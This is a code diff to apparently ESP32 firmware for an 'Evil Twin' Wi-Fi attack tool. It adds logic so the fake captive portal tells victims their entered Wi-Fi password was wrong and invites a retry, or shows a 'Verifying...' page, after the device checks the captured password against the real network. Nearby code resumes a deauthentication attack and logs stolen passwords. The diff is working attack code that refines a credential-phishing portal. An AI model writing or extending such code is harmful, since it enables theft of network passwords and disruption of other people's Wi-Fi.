@@ -249,6 +249,7 @@ char * evilTwinSSID = NULL;
 char * evilTwinPassword = NULL;
 int connectAttemptCount = 0;
 led_strip_handle_t strip;
+static bool last_password_wrong = false;
 
 // SD card HTML file management
 #define MAX_HTML_FILES 50
@@ -396,6 +397,9 @@ static void wifi_event_handler(void *event_handler_arg,
                      (const char*)e->ssid, e->channel,
                      e->bssid[0], e->bssid[1], e->bssid[2], e->bssid[3], e->bssid[4], e->bssid[5]);
             MY_LOG_INFO(TAG, "Wi-Fi: connected to SSID='%s' with password='%s'", evilTwinSSID, evilTwinPassword);
+            
+            // Mark password as correct
+            last_password_wrong = false;
             
             // If portal is active (Evil Twin attack), shut it down after successful connection
             if (portal_active) {
@@ -621,6 +625,9 @@ static void wifi_event_handler(void *event_handler_arg,
                 if (connectAttemptCount >= 3) {
                     ESP_LOGW(TAG, "Evil twin: Too many failed attempts, giving up and going to DEAUTH_EVIL_TWIN. Btw connectAttemptCount: %d ", connectAttemptCount);
                     applicationState = DEAUTH_EVIL_TWIN; //go back to deauth
+                    
+                    // Mark password as wrong for portal feedback
+                    last_password_wrong = true;
                     
                     // Resume deauth attack since password was wrong
                     if (!deauth_attack_active && deauth_attack_task_handle == NULL) {
@@ -1491,6 +1498,8 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             applicationState = DEAUTH;
         } else {
             applicationState = DEAUTH_EVIL_TWIN;
+            // Reset password wrong flag for new attack
+            last_password_wrong = false;
         }
 
         const char *sourceSSID = (const char *)g_scan_results[g_selected_indices[0]].ssid;
@@ -2592,13 +2601,55 @@ static esp_err_t login_handler(httpd_req_t *req) {
         }
     }
     
-    // Send success response
-    const char* response = 
-        "HTTP/1.1 200 OK\r\n"
-        "Content-Type: text/html\r\n"
-        "Content-Length: 200\r\n\r\n"
-        "<!DOCTYPE html><html><head><title>Success</title></head>"
-        "<body><h1>Login Successful!</h1><p>You can now access the internet.</p></body></html>";
+    // Send response based on previous password attempt result
+    const char* response;
+    if (last_password_wrong) {
+        // Show "Wrong Password" message
+        response = 
+            "<!DOCTYPE html><html><head>"
+            "<meta charset='UTF-8'>"
+            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+            "<title>Wrong Password</title>"
+            "<style>"
+            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+            "h1 { text-align: center; color: #d32f2f; margin-bottom: 20px; }"
+            "p { text-align: center; color: #666; }"
+            "a { display: block; text-align: center; margin-top: 20px; padding: 12px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; }"
+            "a:hover { background: #0056b3; }"
+            "</style>"
+            "</head>"
+            "<body>"
+            "<div class='container'>"
+            "<h1>Wrong Password</h1>"
+            "<p>The password you entered is incorrect. Please try again.</p>"
+            "<a href='/portal'>Try Again</a>"
+            "</div>"
+            "</body></html>";
+    } else {
+        // Show "Processing" message
+        response = 
+            "<!DOCTYPE html><html><head>"
+            "<meta charset='UTF-8'>"
+            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+            "<title>Processing</title>"
+            "<style>"
+            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+            "h1 { text-align: center; color: #007bff; margin-bottom: 20px; }"
+            "p { text-align: center; color: #666; }"
+            ".spinner { margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; }"
+            "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
+            "</style>"
+            "</head>"
+            "<body>"
+            "<div class='container'>"
+            "<h1>Verifying...</h1>"
+            "<div class='spinner'></div>"
+            "<p>Please wait while we verify your credentials.</p>"
+            "</div>"
+            "</body></html>";
+    }
     
     httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
     return ESP_OK;
